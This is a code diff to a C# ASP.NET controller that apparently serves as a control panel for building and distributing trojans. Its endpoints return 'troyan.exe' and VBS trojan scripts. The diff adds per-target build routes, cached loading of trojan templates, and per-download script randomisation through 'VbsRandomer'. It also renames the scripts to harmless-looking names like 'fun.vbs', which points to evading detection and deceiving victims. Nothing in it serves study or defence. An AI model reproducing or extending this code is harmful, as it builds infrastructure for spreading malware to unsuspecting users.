@@ -14,6 +14,7 @@ using cp.Code;
 using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.Data.SqlClient;
+using Microsoft.Extensions.Caching.Memory;
 using Microsoft.VisualBasic.CompilerServices;
 using model;
 
@@ -44,10 +45,13 @@ public class CpController : Controller
     
     private readonly ServerService _serverService;
 
-    public CpController(ServerService serverService,IConfiguration configuration)
+    private readonly IMemoryCache _memoryCache;
+    
+    public CpController(ServerService serverService,IConfiguration configuration, IMemoryCache memoryCache)
     {
         _serverService = serverService;
         _connectionString = configuration.GetConnectionString("Default");
+        _memoryCache = memoryCache;
     }
     
     private string Server(string server)
@@ -220,23 +224,11 @@ public class CpController : Controller
     {
         return GetFile(_serverService.GetExe(server), "troyan.exe");
     }
-
-    [HttpGet("{server}/BuildExe")]
-    public IActionResult BuildExe(string server, string exeUrl)
-    {
-        return GetFile(_serverService.GetExe(server), "troyan.exe");
-    }
-
+    
     [HttpGet("{server}/GetVbs")]
     public IActionResult GetVbs(string server)
     {
         return GetFile(_serverService.GetVbs(server), "troyan.vbs");
-    }
-    
-    [HttpGet("{server}/BuildVbs")]
-    public IActionResult BuildVbs(string server, string exeUrl)
-    {
-        return GetFile(_serverService.GetLiteVbs(server), "troyan.vbs");
     }
     
     [HttpGet("{server}/GetLiteVbs")]
@@ -244,14 +236,47 @@ public class CpController : Controller
     {
         return GetFile(_serverService.GetLiteVbs(server), "litetroyan.vbs");
     }
-        
-    [HttpGet("{server}/BuildLiteVbs")]
-    public IActionResult BuildLiteVbs(string server)
+
+    [HttpGet("{server}/{random}/{target}/BuildExe")]
+    public IActionResult BuildExe(string server, string random, string target)
     {
-        return GetFile(_serverService.GetLiteVbs(server), "litetroyan.vbs");
+        return GetFile(_serverService.GetExe(server), "troyan.exe");
     }
     
-
+    protected async Task<IActionResult> GetFileFromString(string server, string file, string name, string random, string target)
+    {
+        try
+        {
+            string fileContent;
+            if (!_memoryCache.TryGetValue(file, out fileContent))
+            {
+                fileContent = await VbsRandomer.ReadFileWithRetryAsync($@"C:\data\{server}\{file}", 2, 50);
+                var cacheEntryOptions = new MemoryCacheEntryOptions()
+                    .SetSlidingExpiration(TimeSpan.FromMinutes(1));
+                _memoryCache.Set(file, fileContent, cacheEntryOptions);
+            }
+            string modifiedContent = VbsRandomer.Modify(fileContent);
+            var fileBytes = Encoding.UTF8.GetBytes(modifiedContent);
+            Response.Headers.Add("Content-Type", "text/plain");
+            return File(fileBytes, "text/plain", name.Split(".")[0] + "_" + System.Environment.TickCount.ToString() + "." + name.Split(".")[1] );
+        }
+        catch (Exception)
+        {
+            return StatusCode(500, "Internal server error");
+        }
+    }
+    
+    [HttpGet("{server}/{random}/{target}/BuildVbs")]
+    public async Task<IActionResult> BuildVbs(string server, string random, string target)
+    {
+        return await GetFileFromString(server, "troyan.c.vbs", "fun.vbs", random, target);
+    }
+    
+    [HttpGet("{server}/{random}/{target}/BuildLiteVbs")]
+    public async Task<IActionResult> BuildLiteVbs(string server, string random, string target)
+    {
+        return await GetFileFromString(server, "litetroyan.c.vbs", "litefun.vbs", random, target);
+    }
     
     [HttpPost()]
     public IActionResult Index(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
